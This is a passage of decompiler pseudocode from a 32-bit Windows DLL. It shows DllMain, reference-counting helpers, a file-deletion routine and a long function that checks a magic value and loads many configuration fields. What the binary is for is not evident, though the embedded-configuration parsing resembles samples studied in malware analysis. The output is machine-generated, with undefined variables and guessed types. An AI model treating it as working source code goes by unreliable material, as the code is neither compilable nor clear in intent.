  if ( *(_DWORD *)(a1[6] + 28) )
  {
    DeleteFileW(*(LPCWSTR *)(v6[1] + 12));
    sub_1004D670((int)a1);
  }
  LOBYTE(v7) = 2;
  sub_1000D3AD(v6);
  return a1;
}
// 100010A7: variable 'v1' is possibly undefined
// 100FBF48: using guessed type int (__thiscall *off_100FBF48[2])(void *Block, char);
// 101042D0: using guessed type int (__thiscall *off_101042D0)(void *Block, char);
// 10001045: using guessed type int var_30[5];

//----- (10001124) --------------------------------------------------------
void *__thiscall sub_10001124(volatile LONG *this, void *a2, int a3)
{
  DWORD v3; // edi
  int v4; // ecx
  volatile LONG *v6; // [esp-8h] [ebp-68h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-64h]
  int v8; // [esp+0h] [ebp-60h] BYREF
  int v9[10]; // [esp+Ch] [ebp-54h] BYREF
  int v10[6]; // [esp+34h] [ebp-2Ch] BYREF
  int v11; // [esp+4Ch] [ebp-14h]
  int *v12; // [esp+50h] [ebp-10h]
  int v13; // [esp+5Ch] [ebp-4h]

  v12 = &v8;
  v11 = 0;
  v7 = this;
  v6 = this;
  v10[5] = (int)&v6;
  sub_1000B964(&v6);
  v13 = 0;
  sub_1000BA6E(-1, 0x80000000, v9, a3, 128, -1, (int)v6, v7);
  v13 = 3;
  sub_1000BBC2(v9);
  v13 = 2;
  v3 = sub_1000C225((HANDLE *)v9);
  sub_1000B1F3((void *)(v3 + 1), (int)v10, 0);
  LOBYTE(v13) = 5;
  sub_1000B79B(v4, v10);
  if ( v3 == sub_1000C4F4((HANDLE *)v9, v10) )
    sub_1000B36F(v10, (int)a2);
  else
    sub_1000B1F3(0, (int)a2, 0);
  v11 = 1;
  LOBYTE(v13) = 2;
  sub_1000B3DF(v10);
  LOBYTE(v13) = 0;
  sub_1000BB54((int)v9);
  return a2;
}
// 100011A2: variable 'v4' is possibly undefined

//----- (10001236) --------------------------------------------------------
LONG *__usercall sub_10001236@<eax>(LONG *a1@<eax>, LONG *a2@<ecx>)
{
  LONG v2; // eax
  int v4; // esi

  v2 = *a1;
  v4 = *a2;
  if ( *a2 != v2 )
  {
    *a2 = v2;
    sub_100012A0(a2);
    if ( v4 )
      sub_1000B119(v4);
  }
  return a2;
}

//----- (10001257) --------------------------------------------------------
char *__thiscall sub_10001257(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 8u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_1000D3AD);
    if ( (a2 & 1) != 0 )
      j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_1000D3AD((int *)Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (100012A0) --------------------------------------------------------
LONG __usercall sub_100012A0@<eax>(LONG *a1@<edi>)
{
  LONG result; // eax
  _DWORD *v2; // esi
  LONG v3; // eax

  result = *a1;
  if ( *a1 )
  {
    if ( !*(_BYTE *)(result + 8) )
    {
      v2 = operator new(0x24u);
      if ( v2 )
      {
        v3 = *a1;
        v2[1] = 0;
        *((_BYTE *)v2 + 8) = 1;
        *v2 = &off_10102390;
        sub_1000CC86((int)v2, *(wchar_t **)(v3 + 12));
      }
      else
      {
        v2 = 0;
      }
      *a1 = (LONG)v2;
    }
    return InterlockedIncrement((volatile LONG *)(*a1 + 4));
  }
  return result;
}
// 10102390: using guessed type int (__thiscall *off_10102390)(void *Block, char);

//----- (1000132C) --------------------------------------------------------
_DWORD *__thiscall sub_1000132C(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  *((_BYTE *)this + 8) = 0;
  *((_BYTE *)this + 9) = 0;
  *((_BYTE *)this + 10) = 0;
  *(_DWORD *)((char *)this + 11) = 0;
  *(_DWORD *)((char *)this + 15) = 0;
  *(_DWORD *)((char *)this + 19) = 0;
  *(_DWORD *)((char *)this + 23) = 0;
  *((_BYTE *)this + 27) = 0;
  return this;
}

//----- (10001351) --------------------------------------------------------
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  char v4[12]; // [esp+4h] [ebp-2Ch] BYREF
  char v5[12]; // [esp+10h] [ebp-20h] BYREF
  char v6[8]; // [esp+1Ch] [ebp-14h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  sub_1000EB36(v6);
  v7 = 0;
  sub_1000EA57();
  LOBYTE(v7) = 1;
  sub_1000EBF7();
  LOBYTE(v7) = 2;
  sub_1000E73C();
  if ( fdwReason == 1 )
    dword_1017A8D0 = (int)hinstDLL;
  LOBYTE(v7) = 1;
  sub_1000EC38(v5);
  LOBYTE(v7) = 0;
  sub_1000EA95(v4);
  v7 = -1;
  sub_1000EB6C(v6);
  return 1;
}
// 1000E73C: using guessed type int sub_1000E73C(void);
// 1000EA57: using guessed type int sub_1000EA57(void);
// 1000EA95: using guessed type int __thiscall sub_1000EA95(_DWORD);
// 1000EB6C: using guessed type int __thiscall sub_1000EB6C(_DWORD);
// 1000EBF7: using guessed type int sub_1000EBF7(void);
// 1000EC38: using guessed type int __thiscall sub_1000EC38(_DWORD);
// 1017A8D0: using guessed type int dword_1017A8D0;
// 10001351: using guessed type char var_14[8];
// 10001351: using guessed type char var_2C[12];
// 10001351: using guessed type char var_20[12];

//----- (100013CC) --------------------------------------------------------
char sub_100013CC()
{
  _DWORD *v0; // eax
  _DWORD *v1; // edi
  _DWORD *v2; // eax
  void *v3; // esi
  int *v4; // esi
  _DWORD *v5; // eax
  _DWORD *v7; // [esp-8h] [ebp-3Ch] BYREF
  volatile LONG *v8; // [esp-4h] [ebp-38h]
  int v9; // [esp+0h] [ebp-34h] BYREF
  void *v10[2]; // [esp+Ch] [ebp-28h] BYREF
  int *v11; // [esp+14h] [ebp-20h] BYREF
  void *Block; // [esp+18h] [ebp-1Ch]
  int *v13; // [esp+1Ch] [ebp-18h]
  int *v14; // [esp+24h] [ebp-10h]
  int v15; // [esp+30h] [ebp-4h]

  v14 = &v9;
  v15 = 0;
  v0 = operator new(0x1Cu);
  Block = v0;
  LOBYTE(v15) = 1;
  if ( v0 )
    v1 = sub_10001045(v0);
  else
    v1 = 0;
  LOBYTE(v15) = 0;
  v2 = operator new(4u);
  Block = v2;
  LOBYTE(v15) = 2;
  if ( v2 )
  {
    *v2 = 1;
    v3 = v2;
  }
  else
  {
    v3 = 0;
  }
  v10[1] = v3;
  v10[0] = v1;
  LOBYTE(v15) = 3;
  Block = operator new(0x74u);
  LOBYTE(v15) = 4;
  if ( Block )
  {
    v13 = (int *)&v7;
    v8 = (volatile LONG *)v3;
    v7 = v1;
    InterlockedIncrement((volatile LONG *)v3);
    LOBYTE(v15) = 4;
    v4 = sub_1000AE6C(Block, (int)v7, v8);
  }
  else
  {
    v4 = 0;
  }
  v13 = v4;
  LOBYTE(v15) = 3;
  v5 = operator new(4u);
  Block = v5;
  LOBYTE(v15) = 6;
  if ( v5 )
    *v5 = 1;
  else
    v5 = 0;
  Block = v5;
  v11 = v4;
  LOBYTE(v15) = 8;
  (*(void (__thiscall **)(int *))(*v4 + 60))(v4);
  v15 = 10;
  (*(void (__thiscall **)(int *, int, _DWORD))(*v4 + 80))(v4, 18000000, 0);
  v15 = 7;
  if ( dword_101308C8 )
  {
    LOBYTE(v15) = 12;
    (*(void (__thiscall **)(int, int, _DWORD))(*(_DWORD *)dword_101308C8 + 80))(dword_101308C8, 18000000, 0);
    v15 = 7;
    if ( dword_101308C8 )
      (**(void (__thiscall ***)(int, int))dword_101308C8)(dword_101308C8, 1);
    dword_101308C8 = 0;
  }
  LOBYTE(v15) = 3;
  sub_10007D7A((void **)&v11);
  LOBYTE(v15) = 0;
  sub_10007D7A(v10);
  return 1;
}
// 101308C8: using guessed type int dword_101308C8;

//----- (100015E4) --------------------------------------------------------
void __usercall sub_100015E4(
        int a1@<edi>,
        int a2,
        int a3,
        int a4,
        int a5,
        int *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12)
{
  int v12; // eax
  _DWORD *v13; // eax
  int v14; // eax
  void (__thiscall **v15)(int, int); // esi
  int v16; // eax
  int v17; // eax
  unsigned int v18; // eax
  int v19[2]; // [esp+Ch] [ebp-24h] BYREF
  int v20[2]; // [esp+14h] [ebp-1Ch] BYREF
  void *Block; // [esp+1Ch] [ebp-14h]
  int v22; // [esp+2Ch] [ebp-4h]

  v22 = 1;
  (*(void (__thiscall **)(int))(*(_DWORD *)a1 + 52))(a1);
  v12 = *a6;
  Block = 0;
  if ( (*(int (__thiscall **)(int *, void *))(v12 + 72))(a6, &unk_101868C4) )
  {
    do
    {
      v13 = sub_10010EC5(&a2, v19, Block);
      LOBYTE(v22) = 2;
      v14 = (*(int (__thiscall **)(_DWORD, int *, int *))(*(_DWORD *)*v13 + 84))(*v13, v20, &a12);
      LOBYTE(v22) = 3;
      v15 = (void (__thiscall **)(int, int))(*(_DWORD *)a1 + 36);
      v16 = sub_1000E111(v14);
      (*v15)(a1, v16);
      LOBYTE(v22) = 2;
      sub_1000D3AD(v20);
      LOBYTE(v22) = 1;
      sub_10007D7A((void **)v19);
      v17 = *a6;
      Block = (char *)Block + 1;
      v18 = (*(int (__thiscall **)(int *, void *))(v17 + 72))(a6, &unk_101868C4);
    }
    while ( (unsigned int)Block < v18 );
  }
  LOBYTE(v22) = 0;
  sub_100016A1((int)&a2);
  v22 = -1;
  sub_1000D3AD(&a12);
}

//----- (100016A1) --------------------------------------------------------
void __stdcall sub_100016A1(int a1)
{
  sub_1000D3AD((int *)(a1 + 32));
  sub_10007846(a1 + 24);
  sub_10007D7A((void **)(a1 + 16));
}

//----- (100016E6) --------------------------------------------------------
char __thiscall sub_100016E6(void **this)
{
  _DWORD *v2; // eax
  void *v3; // eax
  int v4; // eax
  volatile LONG *v5; // ecx
  int v6; // eax
  void *v7; // esi
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // ecx
  void *v17; // eax
  volatile LONG *v18; // ecx
  volatile LONG *v19; // ecx
  int v20; // edi
  int *v21; // ecx
  void *v22; // eax
  volatile LONG *v23; // ecx
  volatile LONG *v24; // ecx
  int v25; // edi
  int *v26; // ecx
  volatile LONG *v27; // ecx
  volatile LONG *v28; // ecx
  int v29; // edi
  int *v30; // ecx
  volatile LONG *v31; // ecx
  volatile LONG *v32; // ecx
  int v33; // edi
  int *v34; // ecx
  volatile LONG *v35; // ecx
  int v36; // eax
  void *v37; // ebx
  void *v38; // eax
  volatile LONG *v39; // ecx
  volatile LONG *v40; // ecx
  int v41; // edi
  volatile LONG *v42; // ecx
  void *v43; // eax
  volatile LONG *v44; // ecx
  volatile LONG *v45; // ecx
  int v46; // edi
  int *v47; // ecx
  volatile LONG *v48; // ecx
  int v49; // eax
  void *v50; // ebx
  void *v51; // eax
  volatile LONG *v52; // ecx
  int *v53; // ecx
  int v54; // edi
  volatile LONG *v55; // ecx
  void *v56; // eax
  volatile LONG *v57; // ecx
  int *v58; // ecx
  int v59; // eax
  unsigned int v60; // eax
  _DWORD *v61; // eax
  int v62; // eax
  _DWORD *v63; // eax
  int v64; // eax
  void *v65; // eax
  int *v66; // ecx
  volatile LONG *v67; // ecx
  int v68; // edi
  volatile LONG *v69; // ecx
  void *v70; // eax
  volatile LONG *v71; // ecx
  int *v72; // ecx
  int v73; // edi
  volatile LONG *v74; // ecx
  volatile LONG *v75; // ecx
  int *v76; // ecx
  int v77; // eax
  void *v78; // esi
  void *v79; // eax
  volatile LONG *v80; // ecx
  volatile LONG *v81; // ecx
  int v82; // edi
  volatile LONG *v83; // ecx
  volatile LONG *v84; // ecx
  volatile LONG *v85; // ecx
  int v86; // eax
  int v87; // esi
  void *v88; // eax
  int v89; // ecx
  volatile LONG *v90; // ecx
  int v91; // edi
  volatile LONG *v92; // ecx
  int v93; // ecx
  volatile LONG *v94; // ecx
  int v95; // eax
  void *v96; // esi
  int v97; // edi
  int v98; // ecx
  void *v99; // eax
  int v100; // ecx
  volatile LONG *v101; // ecx
  int v102; // edi
  int *v103; // ecx
  int v104; // ecx
  volatile LONG *v105; // ecx
  int v106; // eax
  int v107; // esi
  void *v108; // eax
  int v109; // ecx
  int *v110; // ecx
  int v111; // edi
  volatile LONG *v112; // ecx
  int v113; // ecx
  int *v114; // ecx
  int v115; // eax
  void *v116; // ebx
  int v117; // edi
  void *v118; // eax
  int *v119; // ecx
  volatile LONG *v120; // ecx
  int v121; // edi
  volatile LONG *v122; // ecx
  int *v123; // ecx
  volatile LONG *v124; // ecx
  int v125; // edi
  volatile LONG *v126; // ecx
  int *v127; // ecx
  volatile LONG *v128; // ecx
  int v129; // eax
  void *v130; // esi
  volatile LONG *v132; // [esp-124h] [ebp-21Ch] BYREF
  volatile LONG *v133; // [esp-120h] [ebp-218h]
  int v134; // [esp-11Ch] [ebp-214h] BYREF
  int v135; // [esp-118h] [ebp-210h]
  int v136; // [esp-114h] [ebp-20Ch]
  int v137; // [esp-110h] [ebp-208h]
  int *v138; // [esp-10Ch] [ebp-204h]
  volatile LONG *v139; // [esp-108h] [ebp-200h] BYREF
  volatile LONG *v140; // [esp-104h] [ebp-1FCh]
  int v141; // [esp-100h] [ebp-1F8h] BYREF
  volatile LONG *v142; // [esp-FCh] [ebp-1F4h] BYREF
  volatile LONG *v143; // [esp-F8h] [ebp-1F0h]
  int *v144; // [esp-F4h] [ebp-1ECh] BYREF
  int *v145; // [esp-F0h] [ebp-1E8h]
  int v146; // [esp-ECh] [ebp-1E4h] BYREF
  int v147; // [esp-E8h] [ebp-1E0h]
  volatile LONG *v148; // [esp-E4h] [ebp-1DCh] BYREF
  volatile LONG *v149; // [esp-E0h] [ebp-1D8h] BYREF
  int *v150; // [esp-DCh] [ebp-1D4h] BYREF
  int v151; // [esp-D8h] [ebp-1D0h] BYREF
  int v152; // [esp-D4h] [ebp-1CCh]
  int v153; // [esp-D0h] [ebp-1C8h]
  int *v154; // [esp-CCh] [ebp-1C4h] BYREF
  volatile LONG *v155; // [esp-C8h] [ebp-1C0h]
  volatile LONG *v156; // [esp-C4h] [ebp-1BCh] BYREF
  volatile LONG *v157; // [esp-C0h] [ebp-1B8h] BYREF
  volatile LONG *v158; // [esp-BCh] [ebp-1B4h] BYREF
  volatile LONG *v159; // [esp-B8h] [ebp-1B0h] BYREF
  volatile LONG *v160; // [esp-B4h] [ebp-1ACh] BYREF
  volatile LONG *v161; // [esp-B0h] [ebp-1A8h] BYREF
  volatile LONG *v162; // [esp-ACh] [ebp-1A4h]
  int *v163; // [esp-A8h] [ebp-1A0h] BYREF
  int v164; // [esp-A4h] [ebp-19Ch]
  volatile LONG *v165; // [esp-A0h] [ebp-198h] BYREF
  volatile LONG *v166; // [esp-9Ch] [ebp-194h]
  int *v167; // [esp-98h] [ebp-190h] BYREF
  volatile LONG *v168; // [esp-94h] [ebp-18Ch] BYREF
  volatile LONG *v169; // [esp-90h] [ebp-188h] BYREF
  volatile LONG *v170; // [esp-8Ch] [ebp-184h] BYREF
  int *v171; // [esp-88h] [ebp-180h] BYREF
  volatile LONG *v172; // [esp-84h] [ebp-17Ch] BYREF
  int *v173; // [esp-80h] [ebp-178h] BYREF
  int *v174; // [esp-7Ch] [ebp-174h]
  int *v175; // [esp-78h] [ebp-170h] BYREF
  int *v176; // [esp-74h] [ebp-16Ch]
  int *v177; // [esp-70h] [ebp-168h] BYREF
  volatile LONG *v178; // [esp-6Ch] [ebp-164h] BYREF
  int *v179; // [esp-68h] [ebp-160h]
  volatile LONG *v180; // [esp-64h] [ebp-15Ch] BYREF
  volatile LONG *v181; // [esp-60h] [ebp-158h] BYREF
  volatile LONG *v182; // [esp-5Ch] [ebp-154h] BYREF
  volatile LONG *v183; // [esp-58h] [ebp-150h] BYREF
  volatile LONG *v184; // [esp-54h] [ebp-14Ch] BYREF
  volatile LONG *v185; // [esp-50h] [ebp-148h] BYREF
  volatile LONG *v186; // [esp-4Ch] [ebp-144h]
  volatile LONG *v187; // [esp-10h] [ebp-108h] BYREF
  volatile LONG *v188; // [esp-Ch] [ebp-104h]
  int *v189; // [esp-8h] [ebp-100h] BYREF
  int v190; // [esp-4h] [ebp-FCh]
  int v191; // [esp+0h] [ebp-F8h] BYREF
  int v192[6]; // [esp+10h] [ebp-E8h] BYREF
  int v193[10]; // [esp+28h] [ebp-D0h] BYREF
  int v194[5]; // [esp+50h] [ebp-A8h] BYREF
  int v195[2]; // [esp+64h] [ebp-94h] BYREF
  int v196; // [esp+6Ch] [ebp-8Ch] BYREF
  LONG v197[2]; // [esp+70h] [ebp-88h] BYREF
  LONG v198; // [esp+78h] [ebp-80h] BYREF
  int v199[4]; // [esp+7Ch] [ebp-7Ch] BYREF
  int v200[2]; // [esp+8Ch] [ebp-6Ch] BYREF
  void *v201[2]; // [esp+94h] [ebp-64h] BYREF
  int v202[2]; // [esp+9Ch] [ebp-5Ch] BYREF
  void *v203[2]; // [esp+A4h] [ebp-54h] BYREF
  int v204; // [esp+ACh] [ebp-4Ch] BYREF
  int v205; // [esp+B0h] [ebp-48h]
  void *v206[2]; // [esp+B4h] [ebp-44h] BYREF
  void *v207[2]; // [esp+BCh] [ebp-3Ch] BYREF
  void *v208[2]; // [esp+C4h] [ebp-34h] BYREF
  void *i; // [esp+CCh] [ebp-2Ch]
  void *v210; // [esp+D0h] [ebp-28h] BYREF
  void *v211; // [esp+D4h] [ebp-24h]
  void *v212; // [esp+D8h] [ebp-20h]
  void *v213; // [esp+DCh] [ebp-1Ch]
  void *Block[3]; // [esp+E0h] [ebp-18h] BYREF
  int v215; // [esp+F4h] [ebp-4h]

  Block[2] = &v191;
  if ( !this )
  {
    v2 = sub_1000E7F7(Block, 1, 0);
    v215 = 0;
    v190 = 409;
    sub_10007882((int)v2);
  }
  if ( (dword_10193B34 & 1) == 0 )
  {
    dword_10193B34 |= 1u;
    v215 = 1;
    dword_10183460 = 0;
    unk_10183464 = 0;
    sub_1000D17D(dword_10183468, &word_1017C168);
    LOBYTE(v215) = 2;
    dword_10183470[0] = 0;
    dword_10183470[1] = 0;
    sub_1000D17D(dword_10183478, &word_1017C164);
    LOBYTE(v215) = 3;
    dword_10183480[0] = 0;
    dword_10183480[1] = 0;
    sub_1000D17D(dword_10183488, &word_1017C160);
    LOBYTE(v215) = 4;
    dword_10183490[0] = 0;
    dword_10183490[1] = 0;
    dword_10183490[2] = 0;
    sub_10006814(dword_1018349C);
    LOBYTE(v215) = 5;
    sub_10006814(dword_101834AC);
    LOBYTE(v215) = 6;
    sub_10006814(dword_101834BC);
    LOBYTE(v215) = 7;
    sub_10006814(dword_101834CC);
    LOBYTE(v215) = 8;
    sub_10006814(dword_101834DC);
    LOBYTE(v215) = 9;
    sub_10006814(dword_101834EC);
    LOBYTE(v215) = 10;
    unk_101834FC = 0;
    *((_WORD *)&unk_101834FC + 2) = 0;
    sub_10006814(dword_10183502);
    LOBYTE(v215) = 11;
    unk_10183512 = 0;
    sub_10006D46(dword_10183516);
    LOBYTE(v215) = 12;
    sub_10006814(dword_10183526);
    LOBYTE(v215) = 13;
    unk_10183536 = 0;
    *((_DWORD *)&unk_10183536 + 1) = 0;
    *((_DWORD *)&unk_10183536 + 2) = 0;
    *((_BYTE *)&unk_10183536 + 12) = 0;
    sub_10006814(dword_10183543);
    LOBYTE(v215) = 14;
    memset(byte_10183553, 0, 0x18u);
    byte_10183553[24] = 0;
    sub_10006814(dword_1018356C);
    LOBYTE(v215) = 15;
    sub_10006814(dword_1018357C);
    LOBYTE(v215) = 16;
    unk_1018358C = 0;
    *((_DWORD *)&unk_1018358C + 1) = 0;
    *((_DWORD *)&unk_1018358C + 2) = 0;
    *((_DWORD *)&unk_1018358C + 3) = 0;
    *((_DWORD *)&unk_1018358C + 4) = 0;
    *((_BYTE *)&unk_1018358C + 20) = 0;
    sub_10006814(dword_101835A1);
    LOBYTE(v215) = 17;
    unk_101835B1 = 0;
    *((_DWORD *)&unk_101835B1 + 1) = 0;
    *((_DWORD *)&unk_101835B1 + 2) = 0;
    *((_BYTE *)&unk_101835B1 + 12) = 0;
    sub_10006814(dword_101835BE);
    LOBYTE(v215) = 18;
    unk_101835CE = 0;
    *((_DWORD *)&unk_101835CE + 1) = 0;
    *((_BYTE *)&unk_101835CE + 8) = 0;
    sub_10006814(dword_101835D7);
    LOBYTE(v215) = 1;
    atexit(sub_100F332A);
    v215 = -1;
  }
  dword_101842F4 = (int)&dword_10183460;
  if ( *this != (void *)-654826519 )
    return 0;
  v190 = (int)(this + 2);
  v189 = v194;
  sub_1000B1F3(this[1], (int)v194, this + 2);
  v215 = 21;
  sub_1000AAAD((int)v192, v194);
  LOBYTE(v215) = 22;
  sub_1000F0B4(v195, v192);
  LOBYTE(v215) = 23;
  v3 = operator new(0x78u);
  Block[0] = v3;
  LOBYTE(v215) = 24;
  if ( v3 )
    v4 = sub_1000FB8B((int)v3, (void *)v195[0]);
  else
    v4 = 0;
  LOBYTE(v215) = 23;
  sub_1000728E(v206, v4);
  LOBYTE(v215) = 25;
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = 26;
  if ( Block[0] )
  {
    v189 = (int *)v190;
    v212 = &v189;
    sub_1000D372(&v189, (int)&unk_10186734);
    LOBYTE(v215) = 27;
    v188 = v5;
    v187 = v5;
    v213 = &v187;
    sub_1000A205(v206, &v187);
    LOBYTE(v215) = 26;
    v6 = sub_1000F1B1((int)Block[0], (int)v187, v188, (int)v189, v190);
  }
  else
  {
    v6 = 0;
  }
  LOBYTE(v215) = 25;
  sub_1000728E(v203, v6);
  LOBYTE(v215) = 29;
  v7 = v203[0];
  *(_DWORD *)dword_101842F4 = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v203[0] + 72))(v203[0], &unk_101866EC);
  *(_DWORD *)(dword_101842F4 + 4) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 72))(v7, &unk_10186634);
  v8 = (*(int (__thiscall **)(void *, void **, void *))(*(_DWORD *)v7 + 84))(v7, v208, &unk_1018656C);
  LOBYTE(v215) = 30;
  sub_10001236((LONG *)(v8 + 4), (LONG *)(dword_101842F4 + 12));
  LOBYTE(v215) = 29;
  sub_1000D3AD((int *)v208);
  *(_DWORD *)(dword_101842F4 + 16) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 72))(v7, &unk_1018679C);
  *(_DWORD *)(dword_101842F4 + 20) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 72))(v7, &unk_101865DC);
  *(_DWORD *)(dword_101842F4 + 156) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 72))(v7, &unk_10186574);
  v9 = (*(int (__thiscall **)(void *, void **, void *))(*(_DWORD *)v7 + 84))(v7, v208, &unk_1018658C);
  LOBYTE(v215) = 31;
  v10 = sub_1000E111(v9);
  sub_10001236((LONG *)(v10 + 4), (LONG *)(dword_101842F4 + 28));
  LOBYTE(v215) = 29;
  sub_1000D3AD((int *)v208);
  v11 = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 72))(v7, &unk_101867F4);
  v12 = dword_101842F4;
  *(_DWORD *)(dword_101842F4 + 32) = v11;
  *(_DWORD *)(v12 + 36) = 15;
  *(_DWORD *)(dword_101842F4 + 36) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 72))(v7, &unk_1018678C);
  v13 = (*(int (__thiscall **)(void *, void **, void *))(*(_DWORD *)v7 + 84))(v7, v208, &unk_101867B4);
  LOBYTE(v215) = 32;
  v14 = sub_1000E111(v13);
  sub_10001236((LONG *)(v14 + 4), (LONG *)(dword_101842F4 + 44));
  LOBYTE(v215) = 29;
  sub_1000D3AD((int *)v208);
  *(_DWORD *)(dword_101842F4 + 48) = 20;
  if ( (*(unsigned __int8 (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 96))(v7, &unk_10186774) )
    *(_DWORD *)(dword_101842F4 + 48) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 72))(v7, &unk_10186774);
  *(_DWORD *)(dword_101842F4 + 52) = 1;
  if ( (*(unsigned __int8 (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 96))(v7, &unk_1018652C) )
    *(_DWORD *)(dword_101842F4 + 52) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 72))(v7, &unk_1018652C);
  v15 = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v7 + 72))(v7, &unk_101864F4);
  v16 = dword_101842F4;
  *(_DWORD *)(dword_101842F4 + 56) = v15;
  (*(void (__thiscall **)(int))(*(_DWORD *)(v16 + 60) + 52))(v16 + 60);
  if ( *(_DWORD *)(dword_101842F4 + 56) == 2 )
  {
    v17 = operator new(0x28u);
    v18 = v186;
    Block[0] = v17;
    LOBYTE(v215) = 33;
    if ( v17 )
    {
      v185 = v186;
      v213 = &v185;
      sub_1000D372(&v185, (int)&unk_101867C4);
      LOBYTE(v215) = 34;
      v184 = v19;
      v183 = v19;
      v212 = &v183;
      sub_1000A205(v203, &v183);
      LOBYTE(v215) = 33;
      v20 = sub_1000F1B1((int)Block[0], (int)v183, v184, (int)v185, (int)v186);
    }
    else
    {
      v20 = 0;
    }
    LOBYTE(v215) = 29;
    v186 = v18;
    v185 = v18;
    v213 = &v185;
    sub_1000D372(&v185, (int)&unk_10186554);
    LOBYTE(v215) = 36;
    v212 = &v175;
    v174 = v21;
    v173 = v21;
    Block[0] = &v173;
    sub_1000728E(&v173, v20);
    LOBYTE(v215) = 36;
    sub_10010DB1((int)&v175, (int)v173, v174);
    LOBYTE(v215) = 29;
    sub_100015E4(
      dword_101842F4 + 60,
      (int)v175,
      (int)v176,
      (int)v177,
      (int)v178,
      v179,
      (int)v180,
      (int)v181,
      (int)v182,
      (int)v183,
      (int)v184,
      (int)v185);
  }
  v22 = operator new(0x28u);
  v23 = v186;
  Block[0] = v22;
  LOBYTE(v215) = 39;
  if ( v22 )
  {
    v185 = v186;
    v213 = &v185;
    sub_1000D372(&v185, (int)&unk_1018664C);
    LOBYTE(v215) = 40;
    v184 = v24;
    v183 = v24;
    v212 = &v183;
    sub_1000A205(v203, &v183);
    LOBYTE(v215) = 39;
    v25 = sub_1000F1B1((int)Block[0], (int)v183, v184, (int)v185, (int)v186);
  }
  else
  {
    v25 = 0;
  }
  LOBYTE(v215) = 29;
  v186 = v23;
  v185 = v23;
  v213 = &v185;
  sub_1000D372(&v185, (int)&unk_10186654);
  LOBYTE(v215) = 42;
  v212 = &v175;
  v174 = v26;
  v173 = v26;
  Block[0] = &v173;
  sub_1000728E(&v173, v25);
  LOBYTE(v215) = 42;
  sub_10010DB1((int)&v175, (int)v173, v174);
  LOBYTE(v215) = 29;
  sub_100015E4(
    dword_101842F4 + 76,
    (int)v175,
    (int)v176,
    (int)v177,
    (int)v178,
    v179,
    (int)v180,
    (int)v181,
    (int)v182,
    (int)v183,
    (int)v184,
    (int)v185);
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = 45;
  if ( Block[0] )
  {
    v186 = v27;
    v185 = v27;
    v213 = &v185;
    sub_1000D372(&v185, (int)&unk_1018650C);
    LOBYTE(v215) = 46;
    v184 = v28;
    v183 = v28;
    v212 = &v183;
    sub_1000A205(v203, &v183);
    LOBYTE(v215) = 45;
    v29 = sub_1000F1B1((int)Block[0], (int)v183, v184, (int)v185, (int)v186);
  }
  else
  {
    v29 = 0;
  }
  LOBYTE(v215) = 29;
  v186 = v27;
  v185 = v27;
  v213 = &v185;
  sub_1000D372(&v185, (int)&unk_101866BC);
  LOBYTE(v215) = 48;
  v212 = &v175;
  v174 = v30;
  v173 = v30;
  Block[0] = &v173;
  sub_1000728E(&v173, v29);
  LOBYTE(v215) = 48;
  sub_10010DB1((int)&v175, (int)v173, v174);
  LOBYTE(v215) = 29;
  sub_100015E4(
    dword_101842F4 + 92,
    (int)v175,
    (int)v176,
    (int)v177,
    (int)v178,
    v179,
    (int)v180,
    (int)v181,
    (int)v182,
    (int)v183,
    (int)v184,
    (int)v185);
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = 51;
  if ( Block[0] )
  {
    v186 = v31;
    v185 = v31;
    v213 = &v185;
    sub_1000D372(&v185, (int)&unk_101867AC);
    LOBYTE(v215) = 52;
    v184 = v32;
    v183 = v32;
    v212 = &v183;
    sub_1000A205(v203, &v183);
    LOBYTE(v215) = 51;
    v33 = sub_1000F1B1((int)Block[0], (int)v183, v184, (int)v185, (int)v186);
  }
  else
  {
    v33 = 0;
  }
  LOBYTE(v215) = 29;
  v186 = v31;
  v185 = v31;
  v213 = &v185;
  sub_1000D372(&v185, (int)&unk_101866FC);
  LOBYTE(v215) = 54;
  v212 = &v175;
  v174 = v34;
  v173 = v34;
  Block[0] = &v173;
  sub_1000728E(&v173, v33);
  LOBYTE(v215) = 54;
  sub_10010DB1((int)&v175, (int)v173, v174);
  LOBYTE(v215) = 29;
  sub_100015E4(
    dword_101842F4 + 108,
    (int)v175,
    (int)v176,
    (int)v177,
    (int)v178,
    v179,
    (int)v180,
    (int)v181,
    (int)v182,
    (int)v183,
    (int)v184,
    (int)v185);
  if ( (*(unsigned __int8 (__thiscall **)(void *, void *))(*(_DWORD *)v203[0] + 96))(v203[0], &unk_101865C4) )
  {
    Block[0] = operator new(0x28u);
    LOBYTE(v215) = 57;
    if ( Block[0] )
    {
      v184 = v185;
      v213 = &v184;
      sub_1000D372(&v184, (int)&unk_101865C4);
      LOBYTE(v215) = 58;
      v183 = v35;
      v182 = v35;
      v212 = &v182;
      sub_1000A205(v203, &v182);
      LOBYTE(v215) = 57;
      v36 = sub_1000F1B1((int)Block[0], (int)v182, v183, (int)v184, (int)v185);
    }
    else
    {
      v36 = 0;
    }
